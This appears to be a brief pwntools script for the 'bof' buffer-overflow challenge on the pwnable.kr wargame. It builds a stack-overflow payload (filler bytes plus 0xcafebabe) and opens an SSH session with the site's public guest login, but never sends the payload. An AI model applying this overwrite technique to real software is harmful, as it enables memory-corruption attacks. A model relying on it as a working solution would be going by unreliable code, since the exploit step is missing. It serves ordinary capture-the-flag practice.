from pwn import * 
 
flag = 0xcafebabe
payload = b"a"*54
payload += flag.to_bytes(4,'little')

s1 = ssh(host='pwnable.kr', user='bof',password='guest', port=2222)
r1 = s1.process('./bof')
print(r1.recv())
s1.close()